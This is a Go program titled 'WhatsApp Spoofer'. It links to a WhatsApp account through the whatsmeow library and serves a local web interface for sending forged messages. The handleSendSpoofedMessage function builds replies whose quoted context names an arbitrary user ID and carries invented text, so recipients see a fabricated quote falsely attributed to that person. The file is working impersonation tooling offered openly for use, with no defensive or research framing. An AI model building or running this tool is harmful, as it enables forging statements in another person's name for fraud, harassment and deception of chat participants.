// WhatsApp Spoofer - A web-based tool for sending spoofed WhatsApp messages
package main

import (
	"context"
	"embed"
	"encoding/json"
	"errors"
	"flag"
	"io/fs"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"google.golang.org/protobuf/proto"
	_ "modernc.org/sqlite"

	"go.mau.fi/whatsmeow"
	waBinary "go.mau.fi/whatsmeow/binary"
	waE2E "go.mau.fi/whatsmeow/proto/waE2E"
	"go.mau.fi/whatsmeow/store"
	"go.mau.fi/whatsmeow/store/sqlstore"
	"go.mau.fi/whatsmeow/types"
	waLog "go.mau.fi/whatsmeow/util/log"
)

var (
	whatsappClient *whatsmeow.Client
	logger         waLog.Logger
	currentQRCode  string
	isLoggedIn     bool
)

//go:embed client
var clientFS embed.FS

var (
	logLevel        = "INFO"
	debugLogs       = flag.Bool("debug", false, "Enable debug logs")
	dbDialect       = flag.String("db-dialect", "sqlite", "Database dialect (sqlite or postgres)")
	dbAddress       = flag.String("db-address", "file:whats-spoofing.db?_pragma=foreign_keys(1)&_pragma=busy_timeout(5000)&_pragma=journal_mode(WAL)", "Database address")
	requestFullSync = flag.Bool("request-full-sync", false, "Request full (1 year) history sync when logging in")
)

type (
	SpoofedMessageRequest struct {
		ChatID         string `json:"chat_id"`
		MessageID      string `json:"message_id"`
		SpoofedID      string `json:"spoofed_id"`
		SpoofedMessage string `json:"spoofed_message"`
		ReplyMessage   string `json:"reply_message"`
	}

	APIResponse struct {
		Message string `json:"message"`
	}

	StatusResponse struct {
		LoggedIn bool   `json:"loggedIn"`
		QR       string `json:"qr,omitempty"`
	}

	ChatItem struct {
		Name     string `json:"name"`
		PushName string `json:"pushname,omitempty"`
		JID      string `json:"jid"`
		Type     string `json:"type"`
	}
)

func main() {
	waBinary.IndentXML = true
	flag.Parse()

	if *debugLogs {
		logLevel = "DEBUG"
	}
	if *requestFullSync {
		store.DeviceProps.RequireFullSync = proto.Bool(true)
	}
	logger = waLog.Stdout("Main", logLevel, true)

	dbLog := waLog.Stdout("Database", logLevel, true)
	storeContainer, err := sqlstore.New(context.Background(), *dbDialect, *dbAddress, dbLog)
	if err != nil {
		logger.Errorf("Failed to connect to database: %v", err)
		return
	}
	defer storeContainer.Close()

	device, err := storeContainer.GetFirstDevice(context.Background())
	if err != nil {
		logger.Errorf("Failed to get device: %v", err)
		return
	}

	whatsappClient = whatsmeow.NewClient(device, waLog.Stdout("Client", logLevel, true))

	if device != nil && device.ID != nil && len(device.ID.User) > 0 {
		isLoggedIn = true
	}

	whatsappClient.PrePairCallback = func(jid types.JID, platform, businessName string) bool {
		logger.Infof("Accepting pair %s (platform: %q, business name: %q).", jid, platform, businessName)
		return true
	}

	ch, err := whatsappClient.GetQRChannel(context.Background())
	if err != nil {
		if !errors.Is(err, whatsmeow.ErrQRStoreContainsID) {
			logger.Errorf("Failed to get QR channel: %v", err)
		}
	} else {
		go handleQRCodeEvents(ch)
	}

	go startHTTPServer()

	err = whatsappClient.Connect()
	if err != nil {
		logger.Errorf("Failed to connect: %v", err)
		return
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	<-c

	logger.Infof("Interrupt received, exiting")
	whatsappClient.Disconnect()
}

func handleQRCodeEvents(ch <-chan whatsmeow.QRChannelItem) {
	for evt := range ch {
		if evt.Event == "code" {
			currentQRCode = evt.Code
			isLoggedIn = false
			logger.Infof("QR Code generated for login")
		} else {
			logger.Infof("QR channel result: %s", evt.Event)
			if evt.Event == "success" {
				isLoggedIn = true
				currentQRCode = ""
			}
		}
	}
}

func startHTTPServer() {
	mux := http.NewServeMux()

	clientFiles, err := fs.Sub(clientFS, "client")
	if err != nil {
		logger.Errorf("Failed to load client files: %v", err)
	} else {
		fileServer := http.FileServer(http.FS(clientFiles))
		mux.Handle("/", fileServer)
	}

	mux.HandleFunc("/send-spoofed", handleSendSpoofedMessage)
	mux.HandleFunc("/get-groups", handleGetGroups)
	mux.HandleFunc("/get-chats", handleGetChats)
	mux.HandleFunc("/status", handleStatus)

	server := &http.Server{
		Handler:      mux,
		Addr:         "127.0.0.1:8080",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	logger.Infof("HTTP server listening on localhost:8080")
	if err := server.ListenAndServe(); err != nil {
		logger.Errorf("Failed to start HTTP server: %v", err)
	}
}

func apiErrorResponse(w http.ResponseWriter, message string, statusCode int) {
	responseData := APIResponse{
		Message: message,
	}

	w.WriteHeader(statusCode)

	if err := json.NewEncoder(w).Encode(responseData); err != nil {
		http.Error(w, "Error encoding JSON response", http.StatusInternalServerError)
		return
	}
}

func handleSendSpoofedMessage(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		responseData := APIResponse{
			Message: "",
		}

		var requestData SpoofedMessageRequest
		if err := json.NewDecoder(r.Body).Decode(&requestData); err != nil {
			http.Error(w, "Error parsing JSON request body", http.StatusBadRequest)
			return
		}

		if requestData.ChatID == "" || requestData.MessageID == "" || requestData.SpoofedID == "" || requestData.SpoofedMessage == "" || requestData.ReplyMessage == "" {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		logger.Infof("Received send-spoofed request: %+v", requestData)
		w.Header().Set("Content-Type", "application/json")

		chat_jid, ok := parseJID(requestData.ChatID)
		if !ok {
			apiErrorResponse(w, "You need to specify a valid Chat ID (Group or User)", http.StatusBadRequest)
			return
		}

		msgID := requestData.MessageID
		if msgID[0] == '!' {
			msgID = whatsappClient.GenerateMessageID()
		}

		spoofed_jid, ok2 := parseJID(requestData.SpoofedID)
		if !ok2 {
			apiErrorResponse(w, "You need to specify a valid User ID to spoof", http.StatusBadRequest)
			return
		}

		msg := &waE2E.Message{
			ExtendedTextMessage: &waE2E.ExtendedTextMessage{
				Text: proto.String(requestData.ReplyMessage),
				ContextInfo: &waE2E.ContextInfo{
					StanzaID:    proto.String(msgID),
					Participant: proto.String(spoofed_jid.String()),
					RemoteJID:   proto.String(spoofed_jid.String()),
					QuotedMessage: &waE2E.Message{
						Conversation: proto.String(requestData.SpoofedMessage),
					},
				},
			},
		}

		resp, err := whatsappClient.SendMessage(context.Background(), chat_jid, msg)
		if err != nil {
			logger.Errorf("Error sending reply message: %v", err)
			apiErrorResponse(w, "Error on sending spoofed msg: "+err.Error(), http.StatusInternalServerError)
			return
		}

		logger.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		responseData.Message = "Spoofed message sent: " + resp.ID

		w.WriteHeader(http.StatusOK)
		if err := json.NewEncoder(w).Encode(responseData); err != nil {
			http.Error(w, "Error encoding JSON response", http.StatusInternalServerError)
			return
		}

		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleGetGroups(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {

		groups, err := whatsappClient.GetJoinedGroups(context.Background())
		if err != nil {
			apiErrorResponse(w, "Failed to get group list: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result := ""
		for _, group := range groups {
			result += group.GroupName.Name + ": " + group.JID.String() + "\n"
		}

		w.WriteHeader(http.StatusOK)

		w.Write([]byte(result))

		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleGetChats(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		var chats []ChatItem

		contacts, err := whatsappClient.Store.Contacts.GetAllContacts(context.Background())
		if err == nil {
			for jid, info := range contacts {
				chats = append(chats, ChatItem{
					Name:     info.FullName,
					PushName: info.PushName,
					JID:      jid.String(),
					Type:     "contact",
				})
			}
		}

		groups, err := whatsappClient.GetJoinedGroups(context.Background())
		if err == nil {
			for _, group := range groups {
				chats = append(chats, ChatItem{
					Name: group.GroupName.Name,
					JID:  group.JID.String(),
					Type: "group",
				})
			}
		}

		jsonData, err := json.Marshal(chats)
		if err != nil {
			logger.Errorf("Failed to marshal chats: %v", err)
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(string(jsonData)))
			return
		}

		w.WriteHeader(http.StatusOK)
		w.Write([]byte(string(jsonData)))
		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/json")

		response := StatusResponse{
			LoggedIn: isLoggedIn,
		}

		if !isLoggedIn && currentQRCode != "" {
			response.QR = currentQRCode
		}

		w.WriteHeader(http.StatusOK)
		if err := json.NewEncoder(w).Encode(response); err != nil {
			http.Error(w, "Error encoding JSON response", http.StatusInternalServerError)
			return
		}
		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func parseJID(arg string) (types.JID, bool) {
	if arg[0] == '+' {
		arg = arg[1:]
	}
	if !strings.ContainsRune(arg, '@') {
		return types.NewJID(arg, types.DefaultUserServer), true
	} else {
		recipient, err := types.ParseJID(arg)
		if err != nil {
			logger.Errorf("Invalid JID %s: %v", arg, err)
			return recipient, false
		} else if recipient.User == "" {
			logger.Errorf("Invalid JID %s: no server specified", arg)
			return recipient, false
		}
		return recipient, true
	}
}
